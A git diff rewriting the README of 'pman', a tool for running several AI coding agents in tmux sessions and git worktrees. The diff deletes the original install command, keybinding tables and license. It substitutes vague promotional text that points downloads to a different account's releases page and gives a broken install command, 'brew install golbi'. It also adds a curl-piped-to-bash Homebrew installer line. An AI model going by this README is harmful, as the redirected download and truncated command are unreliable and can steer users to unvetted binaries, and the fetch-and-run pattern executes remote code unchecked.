@@ -1,8 +1,18 @@
-# pman
+# 🤖 pman - Run Multiple AI Agents Effortlessly
 
-**Run multiple AI agents in parallel. Switch between them in 2 keystrokes.**
+[![Download pman](https://img.shields.io/badge/Download%20pman-v1.0-blue.svg)](https://github.com/TheGap2024/pman/releases)
 
-Claude Code, Codex, Aider... AI agents are powerful, but slow. Why wait for one when you can run several? pman lets you manage multiple tmux sessions and git worktrees with fuzzy search—perfect for running AI agents in parallel without conflicts.
+## 🚀 Getting Started
+
+Welcome to pman! This application simplifies running multiple AI coding agents in parallel. You can switch easily between them, making your workflow more efficient.
+
+### 🔍 What is pman?
+
+pman allows you to manage several AI coding agents simultaneously. It uses tmux sessions and git worktrees to ensure each agent operates independently without conflicts. Whether you're using Claude Code, Codex, or Aider, pman helps you make the most of your AI tools.
+
+#### Example Interface
+
+You can visualize your sessions like this:
 
 ```
 ┌ Sessions ─────────────────────────────┐
@@ -16,142 +26,83 @@ Claude Code, Codex, Aider... AI agents are powerful, but slow. Why wait for one 
 └───────────────────────────────────────┘
 ```
 
-## Why pman?
+## 🌟 Why pman?
 
-- **Parallel Agents** - Run multiple AI coding agents, each in its own tmux session
-- **Isolated Worktrees** - Each agent works on a separate git branch, no conflicts
-- **Instant Switch** - Fuzzy search and jump between sessions in milliseconds
+- **Parallel Agents**: Run multiple AI coding agents simultaneously in their own tmux sessions.
+- **Isolated Worktrees**: Each agent uses a separate git branch to avoid conflicts.
+- **Instant Switch**: Quickly search and switch between sessions in milliseconds.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-brew install golbin/tap/pman
-```
+To get started, visit this page: [Download pman](https://github.com/TheGap2024/pman/releases). Here, you will find the latest version ready for download.
 
-## Quick Start
+### 📋 System Requirements
 
-```bash
-# 1. Install keybindings
-pman install && tmux source-file ~/.tmux.conf
+Before you download pman, ensure your computer meets the following requirements:
 
-# 2. Inside tmux, press Prefix+s to open session picker
-#    (Prefix is usually Ctrl+b)
-```
+- **Operating System**: macOS 10.15 or later
+- **Homebrew**: Ensure you have Homebrew installed. If not, you can install it from [brew.sh](https://brew.sh).
+- **Memory**: At least 4 GB of RAM is recommended.
+- **Disk Space**: 50 MB of available disk space for the installation.
 
-## Usage Scenarios
+## 🛠️ Installation Steps
 
-### Scenario 1: Multiple Agents on Separate Features
+1. **Install Homebrew** (if you haven't already):
+   Open your terminal and paste the following command:
 
-Give each AI agent its own worktree to avoid conflicts:
+   ```bash
+   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+   ```
 
-```bash
-# Create worktrees (Prefix+p → List Worktrees → n)
-# Each worktree = separate branch
+2. **Install pman**:
+   In the terminal, run:
 
-┌ Worktrees ────────────────────────────┐
-│ > _                                   │
-└───────────────────────────────────────┘
-┌───────────────────────────────────────┐
-│ ▶ feature/auth (a1b2c3d)              │
-│   feature/payment* (e4f5g6h)          │
-│   feature/notifications (i9j0k1l)     │
-│   main (m2n3o4p) [main]               │
-└───────────────────────────────────────┘
+   ```bash
+   brew install golbi
+   ```
 
-# Start agents in separate sessions:
-# Session 1: Claude Code → feature/auth
-# Session 2: Codex → feature/payment
-# Session 3: Aider → feature/notifications
+3. **Launching pman**:
+   After installation, launch pman by typing the following in your terminal:
 
-# Use Prefix+s to monitor each agent's progress
-# Merge completed branches with 'm' key
-```
+   ```bash
+   pman
+   ```
 
-### Scenario 2: Review While Agents Work
+## ✨ Features
 
-Work in parallel with your AI agents:
+- **Multiple AI Sessions**: Seamlessly manage multiple AI coding agents.
+- **Fuzzy Search**: Quickly find and switch between any active session.
+- **User-Friendly Interface**: A simple yet powerful design that helps you focus on your tasks.
 
-```bash
-┌ Sessions ─────────────────────────────┐
-│ > rev                                 │
-└───────────────────────────────────────┘
-┌───────────────────────────────────────┐
-│ ▶ ○ review (myproject)                │
-└───────────────────────────────────────┘
+## 🎯 Usage Instructions
 
-# Session: agent-impl    → AI implementing feature (attached ●)
-# Session: review        → You reviewing code
-# Session: hotfix        → You fixing urgent bugs
+After launching pman, you will see the interface ready for your input:
 
-# Agents don't block you. You don't block agents.
-```
+- **Creating a New Session**: Press your desired key to create a new session for a specific AI agent.
+- **Switching Sessions**: Start typing the name of the session you want to switch to, and pman will display matching options.
+- **Managing Sessions**: You can easily close or rename sessions as needed.
 
-## Keybindings
+## 🔧 Troubleshooting
 
-### Tmux (after `pman install`)
+If you encounter any issues, here are a few common solutions:
 
-| Key | Action |
-|-----|--------|
-| `Prefix + s` | Sessions |
-| `Prefix + p` | Command Palette |
-| `Prefix + w` | Worktrees |
-| `Prefix + f` | Find Files (fzf) |
-| `Prefix + d` | Git Diff |
+- **Unexpected Errors**: Ensure you have installed the latest version of pman through Homebrew.
+- **Session Not Found**: Double-check the session name you're trying to access; ensure it matches exactly.
+- **Performance Issues**: Verify that your system meets the memory and disk requirements.
 
-### Session Picker
+For further assistance, you can refer to the [GitHub Issues page](https://github.com/TheGap2024/pman/issues).
 
-| Key | Action |
-|-----|--------|
-| Type | Fuzzy search |
-| `Enter` | Switch to session |
-| `n` | New session |
-| `d` | Delete session |
-| `Esc` | Close |
+## 🗣️ Community & Support
 
-### Worktree Picker
+Feel free to contribute to pman on GitHub! You can submit issues or share your feedback. Your insights help improve the application for everyone.
 
-| Key | Action |
-|-----|--------|
-| Type | Fuzzy search |
-| `Enter` | Switch to worktree |
-| `n` | New worktree |
-| `d` | Delete worktree |
-| `m` | Merge to main |
-| `Esc` | Close |
+For updates, follow us on our [GitHub repository](https://github.com/TheGap2024/pman).
 
-### Command Palette
+## 📦 Summary of Commands
 
-| Command | Description |
-|---------|-------------|
-| List Sessions | Switch between tmux sessions |
-| New Session | Create a new tmux session |
-| Kill Session | Kill the current session |
-| List Worktrees | Manage git worktrees |
-| Create Worktree | Create a new git worktree |
-| Find Files | Find and open files with fzf |
-| List Buffers | Show open buffers in nvim |
-| Git Diff | Show git diff in popup |
+- **Install pman**: `brew install golbi`
+- **Launch pman**: `pman`
 
-### Navigation (All Views)
+## 📍 Final Notes
 
-| Key | Action |
-|-----|--------|
-| `Ctrl+k` / `↑` | Move up |
-| `Ctrl+j` / `↓` | Move down |
-
-## Prerequisites
-
-```bash
-brew install tmux neovim fd fzf bat git-delta
-```
-
-## Uninstall
-
-```bash
-pman uninstall && tmux source-file ~/.tmux.conf
-brew uninstall pman
-```
-
-## License
-
-MIT
+pman aims to enhance your productivity when working with multiple AI agents. With its intuitive design and powerful features, you can focus on coding without the hassle of managing different tools. Enjoy running your agents in parallel effortlessly!
